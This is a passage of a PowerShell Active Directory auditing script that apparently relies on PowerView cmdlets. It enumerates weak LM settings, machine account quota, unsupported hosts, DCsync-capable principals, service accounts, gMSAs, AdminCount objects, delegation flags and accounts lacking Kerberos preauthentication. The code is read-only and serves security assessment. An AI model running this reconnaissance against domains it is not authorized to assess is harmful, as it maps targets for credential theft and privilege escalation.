			$HTMLLMCompatibilityLevel = $TempLMCompatibilityLevel | Where-Object {$_.Setting -le 2} | ConvertTo-Html -Fragment -PreContent "<h2>LM Compatibility Level</h2>"
		}
	} else {
		foreach ($AllDomain in $AllDomains) {
			$TempLMCompatibilityLevel = Get-DomainGPO -Domain $AllDomain -LDAPFilter "(name=*)" -Properties gpcfilesyspath, displayname |
				ForEach-Object {
					$gpoPath = $_.gpcfilesyspath.TrimStart("[").TrimEnd("]")
					$gpoDisplayName = $_.displayname
					$gpoSetting = (Get-Content -Path "$gpoPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" -Raw | Select-String -Pattern "LmCompatibilityLevel" | Select-Object -Last 1).Line
					$gpoSetting = ($gpoSetting | Out-String) -split "`n"
					$gpoSetting = $gpoSetting | Select-String -Pattern "LmCompatibilityLevel"
					$gpoSetting = ($gpoSetting | Out-String) -split "`n"
					$gpoSetting = $gpoSetting.Trim()
					$gpoSetting = $gpoSetting | Where-Object { $_ -ne "" }

					if ($gpoSetting) {
						$settingValue = ($gpoSetting -split "=")[-1].Trim().Split(",")[-1].Trim()
						$policySetting = $policySettings[$settingValue]

						[PSCustomObject]@{
							"GPO Name" = $gpoDisplayName
							Setting = $settingValue
							"LM Compatibility Level" = $policySetting
						}
					}
				}

			if ($TempLMCompatibilityLevel) {
				$TempLMCompatibilityLevel | Where-Object {$_.Setting -le 2} | Format-Table -AutoSize -Wrap
				$HTMLLMCompatibilityLevel = $TempLMCompatibilityLevel | Where-Object {$_.Setting -le 2} | ConvertTo-Html -Fragment -PreContent "<h2>LM Compatibility Level</h2>"
			}
		}
	}
	
	#################################################
    ########### Machine Account Quota ###############
	#################################################
	
	Write-Host ""
	Write-Host "Machine Account Quota:" -ForegroundColor Cyan

	if ($Domain -and $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		$Quota = (Get-DomainObject -Domain $Domain -Server $Server -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
		$TempMachineQuota = [PSCustomObject]@{
			'Domain' = $Domain
			'Quota' = $Quota
		}

		if ($TempMachineQuota) {
			$TempMachineQuota | Where-Object {$_.Quota -ge 1} | Format-Table -AutoSize
			$HTMLMachineQuota = $TempMachineQuota | Where-Object {$_.Quota -ge 1} | ConvertTo-Html -Fragment -PreContent "<h2>Machine Account Quota</h2>"
		}
	}
	else {
		$TempMachineQuota = foreach ($AllDomain in $AllDomains) {
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			$Quota = (Get-DomainObject -Domain $AllDomain -Identity "$dcName" -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuota
			[PSCustomObject]@{
				'Domain' = $AllDomain
				'Quota' = $Quota
			}
		}

		if ($TempMachineQuota) {
			$TempMachineQuota | Where-Object {$_.Quota -ge 1} | Format-Table -AutoSize
			$HTMLMachineQuota = $TempMachineQuota | Where-Object {$_.Quota -ge 1} | ConvertTo-Html -Fragment -PreContent "<h2>Machine Account Quota</h2>"
		}
	}
	
	########################################################
    ########### Hosts running Unsupported OS ###############
	########################################################
	
	if($NoUnsupportedOS){}
    else{
        Write-Host ""
		Write-Host "Hosts running Unsupported OS:" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$UnsupportedHosts = Get-DomainComputer -Domain $Domain -Server $Server | Where-Object {
				($_.OperatingSystem -like "Windows Me*") -or
				($_.OperatingSystem -like "Windows NT*") -or
				($_.OperatingSystem -like "Windows 95*") -or
				($_.OperatingSystem -like "Windows 98*") -or
				($_.OperatingSystem -like "Windows XP*") -or
				($_.OperatingSystem -like "Windows 7*") -or
				($_.OperatingSystem -like "Windows Vista*") -or
				($_.OperatingSystem -like "Windows 2000*") -or
				($_.OperatingSystem -like "Windows 8*") -or
				($_.OperatingSystem -like "Windows Server 2008*") -or
				($_.OperatingSystem -like "Windows Server 2003*") -or
				($_.OperatingSystem -like "Windows Server 2000*")
			} | Sort-Object -Property DnsHostName

			$TempUnsupportedHosts = foreach ($UnsupportedHost in $UnsupportedHosts) {
				[PSCustomObject]@{
					"Name" = $UnsupportedHost.samaccountname
					"Enabled" = if ($UnsupportedHost.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($UnsupportedHost.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = (Resolve-DnsName -Name $UnsupportedHost.DnsHostName -Type A).IPAddress
					"Account SID" = $UnsupportedHost.objectsid
					"Operating System" = $UnsupportedHost.operatingsystem
					Domain = $Domain
				}
			}

			if ($TempUnsupportedHosts) {
				$TempUnsupportedHosts | Format-Table -AutoSize -Wrap
				$HTMLUnsupportedHosts = $TempUnsupportedHosts | ConvertTo-Html -Fragment -PreContent "<h2>Hosts running Unsupported OS</h2>"
			}
		}
		else {
			$TempUnsupportedHosts = foreach ($AllDomain in $AllDomains) {
				$UnsupportedHosts = Get-DomainComputer -Domain $AllDomain | Where-Object {
					($_.OperatingSystem -like "Windows Me*") -or
					($_.OperatingSystem -like "Windows NT*") -or
					($_.OperatingSystem -like "Windows 95*") -or
					($_.OperatingSystem -like "Windows 98*") -or
					($_.OperatingSystem -like "Windows XP*") -or
					($_.OperatingSystem -like "Windows 7*") -or
					($_.OperatingSystem -like "Windows Vista*") -or
					($_.OperatingSystem -like "Windows 2000*") -or
					($_.OperatingSystem -like "Windows 8*") -or
					($_.OperatingSystem -like "Windows Server 2008*") -or
					($_.OperatingSystem -like "Windows Server 2003*") -or
					($_.OperatingSystem -like "Windows Server 2000*")
				} | Sort-Object -Property DnsHostName

				foreach ($UnsupportedHost in $UnsupportedHosts) {
					[PSCustomObject]@{
						"Name" = $UnsupportedHost.samaccountname
						"Enabled" = if ($UnsupportedHost.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($UnsupportedHost.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"IP Address" = (Resolve-DnsName -Name $UnsupportedHost.DnsHostName -Type A).IPAddress
						"Account SID" = $UnsupportedHost.objectsid
						"Operating System" = $UnsupportedHost.operatingsystem
						Domain = $AllDomain
					}
				}
			}

			if ($TempUnsupportedHosts) {
				$TempUnsupportedHosts | Format-Table -AutoSize -Wrap
				$HTMLUnsupportedHosts = $TempUnsupportedHosts | ConvertTo-Html -Fragment -PreContent "<h2>Hosts running Unsupported OS</h2>"
			}
		}

    }
	
	$InterestingDataBanner = "<h3>Interesting Data</h3>"
	Write-Host ""
	Write-Host "Interesting Data" -ForegroundColor Red
	Write-Host ""
	
	##################################
    ########### DCsync ###############
	##################################

    Write-Host ""
	Write-Host "Retrieve *most* users who can perform DCsync:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "dc=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",dc="
		$replicationUsers = Get-DomainObjectAcl "$dcName" -Domain $Domain -Server $Server -ResolveGUIDs |
			Where-Object { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')} |
			Select-Object -Unique SecurityIdentifier

		$TempReplicationUsers = foreach ($replicationUser in $replicationUsers) {
			[PSCustomObject]@{
				"User or Group Name" = ConvertFrom-SID -Server $Server $replicationUser.SecurityIdentifier
				"Domain" = $Domain
				Members = ((Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse -Identity (ConvertFrom-SID $replicationUser.SecurityIdentifier)).MemberName | Sort-Object -Unique) -join ' - '
			}
		}

		if ($TempReplicationUsers) {
			$TempReplicationUsers | Format-Table -AutoSize -Wrap
			$HTMLReplicationUsers = $TempReplicationUsers | ConvertTo-Html -Fragment -PreContent "<h2>Retrieve *most* users who can perform DC replication (i.e. DCsync)</h2>"
		}
	}
	else {
		$TempReplicationUsers = foreach ($AllDomain in $AllDomains) {
			$dcName = "dc=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",dc="
			$replicationUsers = Get-DomainObjectAcl "$dcName" -Domain $AllDomain -ResolveGUIDs |
				Where-Object { ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')} |
				Select-Object -Unique SecurityIdentifier

			foreach ($replicationUser in $replicationUsers) {
				[PSCustomObject]@{
					"User or Group Name" = ConvertFrom-SID $replicationUser.SecurityIdentifier -Domain $AllDomain
					"Domain" = $AllDomain
					Members = ((Get-DomainGroupMember -Domain $AllDomain -Recurse -Identity (ConvertFrom-SID $replicationUser.SecurityIdentifier)).MemberName | Sort-Object -Unique) -join ' - '
				}
			}
		}

		if ($TempReplicationUsers) {
			$TempReplicationUsers | Format-Table -AutoSize -Wrap
			$HTMLReplicationUsers = $TempReplicationUsers | ConvertTo-Html -Fragment -PreContent "<h2>Retrieve *most* users who can perform DC replication (i.e. DCsync)</h2>"
		}
	}
	
	############################################
    ########### Service Accounts ###############
	############################################
	
	
	Write-Host ""
	Write-Host "Service Accounts:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$ServiceAccounts = Get-DomainUser -SPN -Domain $Domain -Server $Server
		$TempServiceAccounts = foreach ($Account in $ServiceAccounts) {
			[PSCustomObject]@{
				"Account" = $Account.samaccountname
				"Enabled" = if ($Account.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($Account.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($Account.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($Account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($Account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $Account.lastlogontimestamp
				"SID" = $Account.objectSID
				"Domain" = $Domain
				"Groups Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $Account.samaccountname).Name -join ' - '
			}
		}

		if ($TempServiceAccounts) {
			$TempServiceAccounts | Format-Table -AutoSize -Wrap
			$HTMLServiceAccounts = $TempServiceAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Service Accounts</h2>"
		}
	}
	else {
		$TempServiceAccounts = foreach ($AllDomain in $AllDomains) {
			$ServiceAccounts = Get-DomainUser -SPN -Domain $AllDomain
			foreach ($Account in $ServiceAccounts) {
				[PSCustomObject]@{
					"Account" = $Account.samaccountname
					"Enabled" = if ($Account.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Account.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($Account.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($Account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($Account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $Account.lastlogontimestamp
					"SID" = $Account.objectSID
					"Domain" = $AllDomain
					"Groups Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $Account.samaccountname).Name -join ' - '
				}
			}
		}

		if ($TempServiceAccounts) {
			$TempServiceAccounts | Format-Table -AutoSize -Wrap
			$HTMLServiceAccounts = $TempServiceAccounts | ConvertTo-Html -Fragment -PreContent "<h2>Service Accounts</h2>"
		}
	}
	
	##########################################################
    ########### Group Managed Service Accounts ###############
	##########################################################
    
    Write-Host ""
	Write-Host "Group Managed Service Accounts (GMSA):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$GMSAs = Get-DomainObject -Domain $Domain -Server $Server | Where-Object { $_.ObjectClass -eq 'msDS-GroupManagedServiceAccount' }
		$TempGMSAs = foreach ($GMSA in $GMSAs) {
			[PSCustomObject]@{
				"Account" = $GMSA.samaccountname
				"Enabled" = if ($GMSA.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($GMSA.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($GMSA.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($GMSA.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($GMSA.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Account Type" = $GMSA.samaccounttype
				"Pwd Interval" = $GMSA."msds-managedpasswordinterval"
				"Pwd Last Set" = $GMSA.pwdlastset
				"SID" = $GMSA.objectSID
				"Domain" = $Domain
			}
		}

		if ($TempGMSAs) {
			$TempGMSAs | Format-Table -AutoSize -Wrap
			$HTMLGMSAs = $TempGMSAs | ConvertTo-Html -Fragment -PreContent "<h2>Group Managed Service Accounts (GMSA)</h2>"
		}
	}
	else {
		$TempGMSAs = foreach ($AllDomain in $AllDomains) {
			$GMSAs = Get-DomainObject -Domain $AllDomain | Where-Object { $_.ObjectClass -eq 'msDS-GroupManagedServiceAccount' }
			foreach ($GMSA in $GMSAs) {
				[PSCustomObject]@{
					"Account" = $GMSA.samaccountname
					"Enabled" = if ($GMSA.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($GMSA.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($GMSA.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($GMSA.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($GMSA.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Account Type" = $GMSA.samaccounttype
					"Pwd Interval" = $GMSA."msds-managedpasswordinterval"
					"Pwd Last Set" = $GMSA.pwdlastset
					"SID" = $GMSA.objectSID
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempGMSAs) {
			$TempGMSAs | Format-Table -AutoSize -Wrap
			$HTMLGMSAs = $TempGMSAs | ConvertTo-Html -Fragment -PreContent "<h2>Group Managed Service Accounts (GMSA)</h2>"
		}
	}

	##################################################
    ########### Admin Count (Users) ##################
	##################################################
	
	Write-Host ""
    Write-Host "Users with AdminCount set to 1 (non-defaults):" -ForegroundColor Cyan
	
	$excludedUsers = @(
    'krbtgt'
    )
	
	$excludedGroups = @(
    'Administrators',
    'Print Operators',
    'Backup Operators',
    'Replicator',
    'krbtgt',
    'Domain Controllers',
    'Schema Admins',
    'Enterprise Admins',
    'Domain Admins',
    'Server Operators',
    'Account Operators',
    'Read-only Domain Controllers',
    'Key Admins',
    'Enterprise Key Admins'
    )
	
    if ($Domain -and $Server) {
	$excludedGroupsIdentities = foreach($excludedGroup in $excludedGroups){Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $excludedGroup | Select-Object -ExpandProperty MemberName | Sort-Object -Unique}
		$UsersAdminCount = Get-DomainUser -Domain $Domain -Server $Server -AdminCount | Where-Object { $_.samaccountname -notin $excludedUsers -AND $_.samaccountname -notin $excludedGroupsIdentities }
		$TempUsersAdminCount = foreach ($User in $UsersAdminCount) {
			[PSCustomObject]@{
				"User Name" = $User.samaccountname
				"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $User.lastlogontimestamp
				"SID" = $User.objectSID
				"Domain" = $Domain
				"Group Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $User.samaccountname).Name -join ' - '
			}
		}

		if ($TempUsersAdminCount) {
			$TempUsersAdminCount | Format-Table -AutoSize -Wrap
			$HTMLUsersAdminCount = $TempUsersAdminCount | ConvertTo-Html -Fragment -PreContent "<h2>Users with AdminCount set to 1 (non-defaults)</h2>"
		}
	}
	else {
		$TempUsersAdminCount = foreach ($AllDomain in $AllDomains) {
			$excludedGroupsIdentities = foreach($excludedGroup in $excludedGroups){Get-DomainGroupMember -Domain $AllDomain -Identity $excludedGroup | Select-Object -ExpandProperty MemberName | Sort-Object -Unique}
			$UsersAdminCount = Get-DomainUser -Domain $AllDomain -AdminCount | Where-Object { $_.samaccountname -notin $excludedUsers -AND $_.samaccountname -notin $excludedGroupsIdentities }
			foreach ($User in $UsersAdminCount) {
				[PSCustomObject]@{
					"User Name" = $User.samaccountname
					"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $User.lastlogontimestamp
					"SID" = $User.objectSID
					"Domain" = $AllDomain
					"Group Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $User.samaccountname).Name -join ' - '
				}
			}
		}

		if ($TempUsersAdminCount) {
			$TempUsersAdminCount | Format-Table -AutoSize -Wrap
			$HTMLUsersAdminCount = $TempUsersAdminCount | ConvertTo-Html -Fragment -PreContent "<h2>Users with AdminCount set to 1 (non-defaults)</h2>"
		}
	}

	
	##################################################
    ########### Admin Count (Groups) #################
	##################################################
	
	Write-Host ""
    Write-Host "Groups with AdminCount set to 1 (non-defaults):" -ForegroundColor Cyan
	
	$excludedGroups = @(
    'Administrator',
    'Administrators',
    'Print Operators',
    'Backup Operators',
    'Replicator',
    'krbtgt',
    'Domain Controllers',
    'Schema Admins',
    'Enterprise Admins',
    'Domain Admins',
    'Server Operators',
    'Account Operators',
    'Read-only Domain Controllers',
    'Key Admins',
    'Enterprise Key Admins'
    )
	
    if ($Domain -and $Server) {
		$GroupsAdminCount = Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Where-Object { $_.samaccountname -notin $excludedGroups }
		$TempGroupsAdminCount = foreach ($Group in $GroupsAdminCount) {
			[PSCustomObject]@{
				"Group Name" = $Group.samaccountname
				"Group SID" = $Group.objectsid
				"Domain" = $Domain
				"Members" = (Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $Group.samaccountname -Recurse | Select-Object -ExpandProperty MemberName) -join ' - '
			}
		}

		if ($TempGroupsAdminCount) {
			$TempGroupsAdminCount | Format-Table -AutoSize -Wrap
			$HTMLGroupsAdminCount = $TempGroupsAdminCount | ConvertTo-Html -Fragment -PreContent "<h2>Groups with AdminCount set to 1 (non-defaults)</h2>"
		}
	}
	else {
		$TempGroupsAdminCount = foreach ($AllDomain in $AllDomains) {
			$GroupsAdminCount = Get-DomainGroup -Domain $AllDomain -AdminCount | Where-Object { $_.samaccountname -notin $excludedGroups }
			foreach ($Group in $GroupsAdminCount) {
				[PSCustomObject]@{
					"Group Name" = $Group.samaccountname
					"Group SID" = $Group.objectsid
					"Domain" = $AllDomain
					"Members" = (Get-DomainGroupMember -Domain $AllDomain -Identity $Group.samaccountname -Recurse | Select-Object -ExpandProperty MemberName) -join ' - '
				}
			}
		}

		if ($TempGroupsAdminCount) {
			$TempGroupsAdminCount | Format-Table -AutoSize -Wrap
			$HTMLGroupsAdminCount = $TempGroupsAdminCount | ConvertTo-Html -Fragment -PreContent "<h2>Groups with AdminCount set to 1 (non-defaults)</h2>"
		}
	}
	
	####################################################################
    ########### sensitive and not allowed for delegation ###############
	####################################################################
	
	Write-Host ""
	Write-Host "Privileged users that are marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PrivilegedUsers = Get-DomainUser -Domain $Domain -Server $Server -DisallowDelegation -AdminCount
		$TempPrivilegedSensitiveUsers = foreach ($PrivilegedUser in $PrivilegedUsers) {
			[PSCustomObject]@{
				"Account" = $PrivilegedUser.samaccountname
				"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $PrivilegedUser.lastlogontimestamp
				"SID" = $PrivilegedUser.objectSID
				"Domain" = $Domain
			}
		}

		if ($TempPrivilegedSensitiveUsers) {
			$TempPrivilegedSensitiveUsers | Format-Table -AutoSize -Wrap
			$HTMLPrivilegedSensitiveUsers = $TempPrivilegedSensitiveUsers | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users that are marked as 'sensitive and not allowed for delegation'</h2>"
		}
	}
	else {
		$TempPrivilegedSensitiveUsers = foreach ($AllDomain in $AllDomains) {
			$PrivilegedUsers = Get-DomainUser -Domain $AllDomain -DisallowDelegation -AdminCount
			foreach ($PrivilegedUser in $PrivilegedUsers) {
				[PSCustomObject]@{
					"Account" = $PrivilegedUser.samaccountname
					"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $PrivilegedUser.lastlogontimestamp
					"SID" = $PrivilegedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempPrivilegedSensitiveUsers) {
			$TempPrivilegedSensitiveUsers | Format-Table -AutoSize -Wrap
			$HTMLPrivilegedSensitiveUsers = $TempPrivilegedSensitiveUsers | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users that are marked as 'sensitive and not allowed for delegation'</h2>"
		}
	}

	
	####################################################################
    ######## Not (sensitive and not allowed for delegation) ############
	####################################################################
    
    Write-Host ""
	Write-Host "Privileged users that are NOT marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$PrivilegedUsers = Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -AdminCount
		$TempPrivilegedNotSensitiveUsers = foreach ($PrivilegedUser in $PrivilegedUsers) {
			[PSCustomObject]@{
				"Account" = $PrivilegedUser.samaccountname
				"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $PrivilegedUser.lastlogontimestamp
				"SID" = $PrivilegedUser.objectSID
				"Domain" = $Domain
			}
		}

		if ($TempPrivilegedNotSensitiveUsers) {
			$TempPrivilegedNotSensitiveUsers | Format-Table -AutoSize -Wrap
			$HTMLPrivilegedNotSensitiveUsers = $TempPrivilegedNotSensitiveUsers | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users that are not marked as 'sensitive and not allowed for delegation'</h2>"
		}
	}
	else {
		$TempPrivilegedNotSensitiveUsers = foreach ($AllDomain in $AllDomains) {
			$PrivilegedUsers = Get-DomainUser -Domain $AllDomain -AllowDelegation -AdminCount
			foreach ($PrivilegedUser in $PrivilegedUsers) {
				[PSCustomObject]@{
					"Account" = $PrivilegedUser.samaccountname
					"Enabled" = if ($PrivilegedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($PrivilegedUser.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($PrivilegedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($PrivilegedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($PrivilegedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $PrivilegedUser.lastlogontimestamp
					"SID" = $PrivilegedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

		if ($TempPrivilegedNotSensitiveUsers) {
			$TempPrivilegedNotSensitiveUsers | Format-Table -AutoSize -Wrap
			$HTMLPrivilegedNotSensitiveUsers = $TempPrivilegedNotSensitiveUsers | ConvertTo-Html -Fragment -PreContent "<h2>Privileged users that are not marked as 'sensitive and not allowed for delegation'</h2>"
		}
	}
	
	####################################################################
    ########### Machine Accounts in Privileged Groups) #################
	####################################################################
	
	Write-Host ""
    Write-Host "Machine accounts in privileged groups:" -ForegroundColor Cyan
    if ($Domain -and $Server) {
		$MachinePrivGroupMembers = Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Get-DomainGroupMember -Domain $Domain -Server $Server -Recurse | Where-Object { $_.MemberName -like '*$' } | Sort-Object -Unique
		$TempMachineAccountsPriv = foreach ($GroupMember in $MachinePrivGroupMembers) {
			[PSCustomObject]@{
				"Member" = $GroupMember.MemberName
				"Enabled" = if ($GroupMember.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ((Get-DomainComputer -Identity $GroupMember.MemberName.TrimEnd('$') -Domain $Domain -Server $Server).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"IP Address" = Resolve-DnsName -Name ($GroupMember.MemberName.TrimEnd('$')) -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
				"Member SID" = $GroupMember.MemberSID
				"Operating System" = Get-DomainComputer $GroupMember.MemberName.TrimEnd('$') | Select-Object -ExpandProperty operatingsystem
				"Member Domain" = $GroupMember.MemberDomain
				"Privileged Group" = $GroupMember.GroupName
				"Group Domain" = $GroupMember.GroupDomain
			}
		}

		if ($TempMachineAccountsPriv) {
			$TempMachineAccountsPriv | Format-Table -AutoSize -Wrap
			$HTMLMachineAccountsPriv = $TempMachineAccountsPriv | ConvertTo-Html -Fragment -PreContent "<h2>Machine accounts in privileged groups</h2>"
		}
	}
	else {
		$TempMachineAccountsPriv = foreach ($AllDomain in $AllDomains) {
			$Server = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$MachinePrivGroupMembers = Get-DomainGroup -Domain $AllDomain -AdminCount | Get-DomainGroupMember -Recurse | Where-Object { $_.MemberName -like '*$' } | Sort-Object -Unique
			foreach ($GroupMember in $MachinePrivGroupMembers) {
				[PSCustomObject]@{
					"Member" = $GroupMember.MemberName
					"Enabled" = if ($GroupMember.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ((Get-DomainComputer -Identity $GroupMember.MemberName.TrimEnd('$') -Domain $AllDomain).lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = Resolve-DnsName -Name ($GroupMember.MemberName.TrimEnd('$')) -Type A -Server $Server | Select-Object -ExpandProperty IPAddress
					"Member SID" = $GroupMember.MemberSID
					"Operating System" = Get-DomainComputer $GroupMember.MemberName.TrimEnd('$') | Select-Object -ExpandProperty operatingsystem
					"Member Domain" = $GroupMember.MemberDomain
					"Privileged Group" = $GroupMember.GroupName
					"Group Domain" = $GroupMember.GroupDomain
				}
			}
		}

		if ($TempMachineAccountsPriv) {
			$TempMachineAccountsPriv | Format-Table -AutoSize -Wrap
			$HTMLMachineAccountsPriv = $TempMachineAccountsPriv | ConvertTo-Html -Fragment -PreContent "<h2>Machine accounts in privileged groups</h2>"
		}
	}
	
	################################################
    ########### No preauthentication ###############
	################################################
    
    Write-Host ""
	Write-Host "Users without kerberos preauthentication set:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$nopreauthsetUsers = Get-DomainUser -Domain $Domain -Server $Server -PreauthNotRequired
		$Tempnopreauthset = foreach ($User in $nopreauthsetUsers) {
			[PSCustomObject]@{
				"UserName" = $User.samaccountname
				"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
				"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
				"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $User.lastlogontimestamp
				"SID" = $User.objectSID
				"Domain" = $Domain
			}
		}

		if ($Tempnopreauthset) {
			$Tempnopreauthset | Format-Table -AutoSize -Wrap
			$HTMLnopreauthset = $Tempnopreauthset | ConvertTo-Html -Fragment -PreContent "<h2>Users without kerberos preauthentication set</h2>"
		}
	}
	else {
		$Tempnopreauthset = foreach ($AllDomain in $AllDomains) {
			$nopreauthsetUsers = Get-DomainUser -Domain $AllDomain -PreauthNotRequired
			foreach ($User in $nopreauthsetUsers) {
				[PSCustomObject]@{
					"UserName" = $User.samaccountname
					"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
					"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $User.lastlogontimestamp
					"SID" = $User.objectSID
					"Domain" = $AllDomain
				}
			}
		}

		if ($Tempnopreauthset) {
			$Tempnopreauthset | Format-Table -AutoSize -Wrap
			$HTMLnopreauthset = $Tempnopreauthset | ConvertTo-Html -Fragment -PreContent "<h2>Users without kerberos preauthentication set</h2>"
		}
